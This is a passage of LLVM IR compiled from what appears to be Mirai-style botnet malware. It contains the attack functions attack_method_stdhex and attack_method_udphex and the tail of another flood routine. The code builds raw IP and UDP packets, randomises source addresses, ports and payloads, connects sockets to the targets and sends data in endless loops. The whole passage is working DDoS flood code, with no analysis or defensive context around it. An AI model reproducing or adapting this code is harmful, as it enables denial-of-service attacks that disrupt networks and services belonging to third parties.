  %270 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %267, i64 %269
  %271 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %270, i32 0, i32 2
  %272 = load i8, i8* %271, align 4
  %273 = zext i8 %272 to i32
  %274 = icmp slt i32 %273, 32
  br i1 %274, label %275, label %296

275:                                              ; preds = %247
  %276 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %277 = load i32, i32* %9, align 4
  %278 = sext i32 %277 to i64
  %279 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %276, i64 %278
  %280 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %279, i32 0, i32 1
  %281 = load i32, i32* %280, align 4
  %282 = call i32 @ntohl(i32 noundef %281) #9
  %283 = call i32 @rand_next()
  %284 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %285 = load i32, i32* %9, align 4
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %284, i64 %286
  %288 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %287, i32 0, i32 2
  %289 = load i8, i8* %288, align 4
  %290 = zext i8 %289 to i32
  %291 = lshr i32 %283, %290
  %292 = add i32 %282, %291
  %293 = call i32 @htonl(i32 noundef %292) #9
  %294 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %295 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %294, i32 0, i32 9
  store i32 %293, i32* %295, align 4
  br label %296

296:                                              ; preds = %275, %247
  %297 = load i32, i32* %21, align 4
  %298 = icmp eq i32 %297, -1
  br i1 %298, label %299, label %303

299:                                              ; preds = %296
  %300 = call i32 @rand_next()
  %301 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %302 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %301, i32 0, i32 8
  store i32 %300, i32* %302, align 4
  br label %303

303:                                              ; preds = %299, %296
  %304 = load i16, i16* %13, align 2
  %305 = zext i16 %304 to i32
  %306 = icmp eq i32 %305, 65535
  br i1 %306, label %307, label %322

307:                                              ; preds = %303
  %308 = call i32 @rand_next()
  %309 = and i32 %308, 65535
  %310 = trunc i32 %309 to i16
  %311 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %312 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %311, i32 0, i32 3
  store i16 %310, i16* %312, align 4
  %313 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %314 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %313, i32 0, i32 3
  %315 = load i16, i16* %314, align 4
  %316 = zext i16 %315 to i32
  %317 = sub nsw i32 %316, 1000
  %318 = xor i32 %317, -1
  %319 = trunc i32 %318 to i16
  %320 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %321 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %320, i32 0, i32 3
  store i16 %319, i16* %321, align 4
  br label %322

322:                                              ; preds = %307, %303
  %323 = load i16, i16* %16, align 2
  %324 = zext i16 %323 to i32
  %325 = icmp eq i32 %324, 65535
  br i1 %325, label %326, label %332

326:                                              ; preds = %322
  %327 = call i32 @rand_next()
  %328 = and i32 %327, 65535
  %329 = trunc i32 %328 to i16
  %330 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %331 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %330, i32 0, i32 0
  store i16 %329, i16* %331, align 2
  br label %332

332:                                              ; preds = %326, %322
  %333 = load i16, i16* %17, align 2
  %334 = zext i16 %333 to i32
  %335 = icmp eq i32 %334, 65535
  br i1 %335, label %336, label %342

336:                                              ; preds = %332
  %337 = call i32 @rand_next()
  %338 = and i32 %337, 65535
  %339 = trunc i32 %338 to i16
  %340 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %341 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %340, i32 0, i32 1
  store i16 %339, i16* %341, align 2
  br label %342

342:                                              ; preds = %336, %332
  %343 = load i8, i8* %20, align 1
  %344 = icmp ne i8 %343, 0
  br i1 %344, label %349, label %345

345:                                              ; preds = %342
  %346 = call i32 @rand_next()
  %347 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i32 0, i32 9
  store i32 %346, i32* %348, align 4
  br label %355

349:                                              ; preds = %342
  %350 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %351 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %350, i32 0, i32 9
  %352 = load i32, i32* %351, align 4
  %353 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %354 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %353, i32 0, i32 9
  store i32 %352, i32* %354, align 4
  br label %355

355:                                              ; preds = %349, %345
  %356 = load i8, i8* %19, align 1
  %357 = icmp ne i8 %356, 0
  br i1 %357, label %358, label %361

358:                                              ; preds = %355
  %359 = load i8*, i8** %31, align 8
  %360 = load i32, i32* %18, align 4
  call void @rand_str(i8* noundef %359, i32 noundef %360)
  br label %361

361:                                              ; preds = %358, %355
  %362 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %363 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %362, i32 0, i32 7
  store i16 0, i16* %363, align 2
  %364 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %365 = bitcast %struct.iphdr* %364 to i16*
  %366 = call zeroext i16 @checksum_generic(i16* noundef %365, i32 noundef 20)
  %367 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %368 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %367, i32 0, i32 7
  store i16 %366, i16* %368, align 2
  %369 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %370 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %369, i32 0, i32 7
  store i16 0, i16* %370, align 2
  %371 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %372 = bitcast %struct.iphdr* %371 to i16*
  %373 = call zeroext i16 @checksum_generic(i16* noundef %372, i32 noundef 20)
  %374 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %375 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %374, i32 0, i32 7
  store i16 %373, i16* %375, align 2
  %376 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %377 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %376, i32 0, i32 3
  store i16 0, i16* %377, align 2
  %378 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %379 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %380 = bitcast %struct.udphdr* %379 to i8*
  %381 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %382 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %381, i32 0, i32 2
  %383 = load i16, i16* %382, align 2
  %384 = load i32, i32* %18, align 4
  %385 = sext i32 %384 to i64
  %386 = add i64 8, %385
  %387 = trunc i64 %386 to i32
  %388 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %378, i8* noundef %380, i16 noundef zeroext %383, i32 noundef %387)
  %389 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %390 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %389, i32 0, i32 3
  store i16 %388, i16* %390, align 2
  %391 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %392 = load i32, i32* %9, align 4
  %393 = sext i32 %392 to i64
  %394 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %391, i64 %393
  %395 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %394, i32 0, i32 0
  %396 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %395, i32 0, i32 0
  store i16 2, i16* %396, align 4
  %397 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %398 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %397, i32 0, i32 9
  %399 = load i32, i32* %398, align 4
  %400 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %401 = load i32, i32* %9, align 4
  %402 = sext i32 %401 to i64
  %403 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %400, i64 %402
  %404 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %403, i32 0, i32 0
  %405 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %404, i32 0, i32 2
  %406 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %405, i32 0, i32 0
  store i32 %399, i32* %406, align 4
  %407 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %408 = load i32, i32* %9, align 4
  %409 = sext i32 %408 to i64
  %410 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %407, i64 %409
  %411 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %410, i32 0, i32 0
  %412 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %411, i32 0, i32 1
  store i16 0, i16* %412, align 2
  %413 = load i32, i32* %10, align 4
  %414 = load i8*, i8** %26, align 8
  %415 = load i32, i32* %18, align 4
  %416 = sext i32 %415 to i64
  %417 = add i64 52, %416
  %418 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %419 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %420 = load i32, i32* %9, align 4
  %421 = sext i32 %420 to i64
  %422 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %419, i64 %421
  %423 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %422, i32 0, i32 0
  %424 = bitcast %struct.sockaddr_in* %423 to %struct.sockaddr*
  store %struct.sockaddr* %424, %struct.sockaddr** %418, align 8
  %425 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %426 = load %struct.sockaddr*, %struct.sockaddr** %425, align 8
  %427 = call i64 @sendto(i32 noundef %413, i8* noundef %414, i64 noundef %417, i32 noundef 16384, %struct.sockaddr* %426, i32 noundef 16)
  br label %428

428:                                              ; preds = %361
  %429 = load i32, i32* %9, align 4
  %430 = add nsw i32 %429, 1
  store i32 %430, i32* %9, align 4
  br label %242, !llvm.loop !30

431:                                              ; preds = %242
  br label %241

432:                                              ; preds = %83, %77
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_method_stdhex(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %24 = load i8, i8* %5, align 1
  %25 = zext i8 %24 to i64
  %26 = call noalias i8* @calloc(i64 noundef %25, i64 noundef 8) #8
  %27 = bitcast i8* %26 to i8**
  store i8** %27, i8*** %10, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 noundef %29, i64 noundef 4) #8
  %31 = bitcast i8* %30 to i32*
  store i32* %31, i32** %11, align 8
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 noundef zeroext %32, %struct.attack_option* noundef %33, i8 noundef zeroext 7, i32 noundef 65535)
  %35 = trunc i32 %34 to i16
  store i16 %35, i16* %12, align 2
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 noundef zeroext %36, %struct.attack_option* noundef %37, i8 noundef zeroext 6, i32 noundef 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 noundef zeroext %40, %struct.attack_option* noundef %41, i8 noundef zeroext 0, i32 noundef 1294)
  %43 = trunc i32 %42 to i16
  store i16 %43, i16* %14, align 2
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 noundef zeroext %44, %struct.attack_option* noundef %45, i8 noundef zeroext 1, i32 noundef 1)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %48, i8 0, i64 16, i1 false)
  %49 = load i16, i16* %13, align 2
  %50 = zext i16 %49 to i32
  %51 = icmp eq i32 %50, 65535
  br i1 %51, label %52, label %55

52:                                               ; preds = %4
  %53 = call i32 @rand_next()
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %13, align 2
  br label %58

55:                                               ; preds = %4
  %56 = load i16, i16* %13, align 2
  %57 = call zeroext i16 @htons(i16 noundef zeroext %56) #9
  store i16 %57, i16* %13, align 2
  br label %58

58:                                               ; preds = %55, %52
  store i32 0, i32* %9, align 4
  br label %59

59:                                               ; preds = %171, %58
  %60 = load i32, i32* %9, align 4
  %61 = load i8, i8* %5, align 1
  %62 = zext i8 %61 to i32
  %63 = icmp slt i32 %60, %62
  br i1 %63, label %64, label %174

64:                                               ; preds = %59
  %65 = call noalias i8* @calloc(i64 noundef 65535, i64 noundef 1) #8
  %66 = load i8**, i8*** %10, align 8
  %67 = load i32, i32* %9, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds i8*, i8** %66, i64 %68
  store i8* %65, i8** %69, align 8
  %70 = load i16, i16* %12, align 2
  %71 = zext i16 %70 to i32
  %72 = icmp eq i32 %71, 65535
  br i1 %72, label %73, label %82

73:                                               ; preds = %64
  %74 = call i32 @rand_next()
  %75 = trunc i32 %74 to i16
  %76 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %77 = load i32, i32* %9, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %76, i64 %78
  %80 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %79, i32 0, i32 0
  %81 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %80, i32 0, i32 1
  store i16 %75, i16* %81, align 2
  br label %91

82:                                               ; preds = %64
  %83 = load i16, i16* %12, align 2
  %84 = call zeroext i16 @htons(i16 noundef zeroext %83) #9
  %85 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %86 = load i32, i32* %9, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %85, i64 %87
  %89 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %88, i32 0, i32 0
  %90 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %89, i32 0, i32 1
  store i16 %84, i16* %90, align 2
  br label %91

91:                                               ; preds = %82, %73
  %92 = call i32 @socket(i32 noundef 2, i32 noundef 2, i32 noundef 0) #8
  %93 = load i32*, i32** %11, align 8
  %94 = load i32, i32* %9, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds i32, i32* %93, i64 %95
  store i32 %92, i32* %96, align 4
  %97 = icmp eq i32 %92, -1
  br i1 %97, label %98, label %99

98:                                               ; preds = %91
  ret void

99:                                               ; preds = %91
  %100 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %100, align 4
  %101 = load i16, i16* %13, align 2
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %101, i16* %102, align 2
  %103 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %104 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %103, i32 0, i32 0
  store i32 0, i32* %104, align 4
  %105 = load i32*, i32** %11, align 8
  %106 = load i32, i32* %9, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds i32, i32* %105, i64 %107
  %109 = load i32, i32* %108, align 4
  %110 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %111 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %111, %struct.sockaddr** %110, align 8
  %112 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %113 = load %struct.sockaddr*, %struct.sockaddr** %112, align 8
  %114 = call i32 @bind(i32 noundef %109, %struct.sockaddr* %113, i32 noundef 16) #8
  %115 = icmp eq i32 %114, -1
  br i1 %115, label %116, label %117

116:                                              ; preds = %99
  br label %117

117:                                              ; preds = %116, %99
  %118 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %119 = load i32, i32* %9, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %118, i64 %120
  %122 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %121, i32 0, i32 2
  %123 = load i8, i8* %122, align 4
  %124 = zext i8 %123 to i32
  %125 = icmp slt i32 %124, 32
  br i1 %125, label %126, label %152

126:                                              ; preds = %117
  %127 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %128 = load i32, i32* %9, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %127, i64 %129
  %131 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %130, i32 0, i32 1
  %132 = load i32, i32* %131, align 4
  %133 = call i32 @ntohl(i32 noundef %132) #9
  %134 = call i32 @rand_next()
  %135 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %136 = load i32, i32* %9, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %135, i64 %137
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %138, i32 0, i32 2
  %140 = load i8, i8* %139, align 4
  %141 = zext i8 %140 to i32
  %142 = lshr i32 %134, %141
  %143 = add i32 %133, %142
  %144 = call i32 @htonl(i32 noundef %143) #9
  %145 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %146 = load i32, i32* %9, align 4
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %145, i64 %147
  %149 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %148, i32 0, i32 0
  %150 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %149, i32 0, i32 2
  %151 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %150, i32 0, i32 0
  store i32 %144, i32* %151, align 4
  br label %152

152:                                              ; preds = %126, %117
  %153 = load i32*, i32** %11, align 8
  %154 = load i32, i32* %9, align 4
  %155 = sext i32 %154 to i64
  %156 = getelementptr inbounds i32, i32* %153, i64 %155
  %157 = load i32, i32* %156, align 4
  %158 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %159 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %160 = load i32, i32* %9, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %159, i64 %161
  %163 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %162, i32 0, i32 0
  %164 = bitcast %struct.sockaddr_in* %163 to %struct.sockaddr*
  store %struct.sockaddr* %164, %struct.sockaddr** %158, align 8
  %165 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %166 = load %struct.sockaddr*, %struct.sockaddr** %165, align 8
  %167 = call i32 @connect(i32 noundef %157, %struct.sockaddr* %166, i32 noundef 16)
  %168 = icmp eq i32 %167, -1
  br i1 %168, label %169, label %170

169:                                              ; preds = %152
  br label %170

170:                                              ; preds = %169, %152
  br label %171

171:                                              ; preds = %170
  %172 = load i32, i32* %9, align 4
  %173 = add nsw i32 %172, 1
  store i32 %173, i32* %9, align 4
  br label %59, !llvm.loop !31

174:                                              ; preds = %59
  %175 = load i8*, i8** @hexPayload, align 8
  %176 = call i64 @strlen(i8* noundef %175) #11
  %177 = trunc i64 %176 to i32
  store i32 %177, i32* %22, align 4
  br label %178

178:                                              ; preds = %218, %174
  store i32 0, i32* %9, align 4
  br label %179

179:                                              ; preds = %215, %178
  %180 = load i32, i32* %9, align 4
  %181 = load i8, i8* %5, align 1
  %182 = zext i8 %181 to i32
  %183 = icmp slt i32 %180, %182
  br i1 %183, label %184, label %218

184:                                              ; preds = %179
  %185 = load i8**, i8*** %10, align 8
  %186 = load i32, i32* %9, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds i8*, i8** %185, i64 %187
  %189 = load i8*, i8** %188, align 8
  store i8* %189, i8** %23, align 8
  %190 = load i8, i8* %15, align 1
  %191 = icmp ne i8 %190, 0
  br i1 %191, label %192, label %196

192:                                              ; preds = %184
  %193 = load i8*, i8** %23, align 8
  %194 = load i16, i16* %14, align 2
  %195 = zext i16 %194 to i32
  call void @rand_str(i8* noundef %193, i32 noundef %195)
  br label %196

196:                                              ; preds = %192, %184
  %197 = load i32*, i32** %11, align 8
  %198 = load i32, i32* %9, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds i32, i32* %197, i64 %199
  %201 = load i32, i32* %200, align 4
  %202 = load i8*, i8** %23, align 8
  %203 = load i16, i16* %14, align 2
  %204 = zext i16 %203 to i64
  %205 = call i64 @send(i32 noundef %201, i8* noundef %202, i64 noundef %204, i32 noundef 16384)
  %206 = load i32*, i32** %11, align 8
  %207 = load i32, i32* %9, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds i32, i32* %206, i64 %208
  %210 = load i32, i32* %209, align 4
  %211 = load i8*, i8** @hexPayload, align 8
  %212 = load i32, i32* %22, align 4
  %213 = sext i32 %212 to i64
  %214 = call i64 @send(i32 noundef %210, i8* noundef %211, i64 noundef %213, i32 noundef 16384)
  br label %215

215:                                              ; preds = %196
  %216 = load i32, i32* %9, align 4
  %217 = add nsw i32 %216, 1
  store i32 %217, i32* %9, align 4
  br label %179, !llvm.loop !32

218:                                              ; preds = %179
  br label %178
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_method_udphex(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 noundef %24, i64 noundef 8) #8
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 noundef %28, i64 noundef 4) #8
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 noundef zeroext %31, %struct.attack_option* noundef %32, i8 noundef zeroext 7, i32 noundef 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 noundef zeroext %35, %struct.attack_option* noundef %36, i8 noundef zeroext 6, i32 noundef 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 noundef zeroext %39, %struct.attack_option* noundef %40, i8 noundef zeroext 0, i32 noundef 1294)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 noundef zeroext %43, %struct.attack_option* noundef %44, i8 noundef zeroext 1, i32 noundef 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %47, i8 0, i64 16, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

51:                                               ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %57

54:                                               ; preds = %4
  %55 = load i16, i16* %13, align 2
  %56 = call zeroext i16 @htons(i16 noundef zeroext %55) #9
  store i16 %56, i16* %13, align 2
  br label %57

57:                                               ; preds = %54, %51
  store i32 0, i32* %9, align 4
  br label %58

58:                                               ; preds = %170, %57
  %59 = load i32, i32* %9, align 4
  %60 = load i8, i8* %5, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp slt i32 %59, %61
  br i1 %62, label %63, label %173

63:                                               ; preds = %58
  %64 = call noalias i8* @calloc(i64 noundef 65535, i64 noundef 1) #8
  %65 = load i8**, i8*** %10, align 8
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8*, i8** %65, i64 %67
  store i8* %64, i8** %68, align 8
  %69 = load i16, i16* %12, align 2
  %70 = zext i16 %69 to i32
  %71 = icmp eq i32 %70, 65535
  br i1 %71, label %72, label %81

72:                                               ; preds = %63
  %73 = call i32 @rand_next()
  %74 = trunc i32 %73 to i16
  %75 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %75, i64 %77
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i32 0, i32 0
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %79, i32 0, i32 1
  store i16 %74, i16* %80, align 2
  br label %90

81:                                               ; preds = %63
  %82 = load i16, i16* %12, align 2
  %83 = call zeroext i16 @htons(i16 noundef zeroext %82) #9
  %84 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 0
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %88, i32 0, i32 1
  store i16 %83, i16* %89, align 2
  br label %90

90:                                               ; preds = %81, %72
  %91 = call i32 @socket(i32 noundef 2, i32 noundef 2, i32 noundef 17) #8
  %92 = load i32*, i32** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i32, i32* %92, i64 %94
  store i32 %91, i32* %95, align 4
  %96 = icmp eq i32 %91, -1
  br i1 %96, label %97, label %98

97:                                               ; preds = %90
  ret void

98:                                               ; preds = %90
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %99, align 4
  %100 = load i16, i16* %13, align 2
  %101 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %100, i16* %101, align 2
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  store i32 0, i32* %103, align 4
  %104 = load i32*, i32** %11, align 8
  %105 = load i32, i32* %9, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i32, i32* %104, i64 %106
  %108 = load i32, i32* %107, align 4
  %109 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %110 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %110, %struct.sockaddr** %109, align 8
  %111 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %112 = load %struct.sockaddr*, %struct.sockaddr** %111, align 8
  %113 = call i32 @bind(i32 noundef %108, %struct.sockaddr* %112, i32 noundef 16) #8
  %114 = icmp eq i32 %113, -1
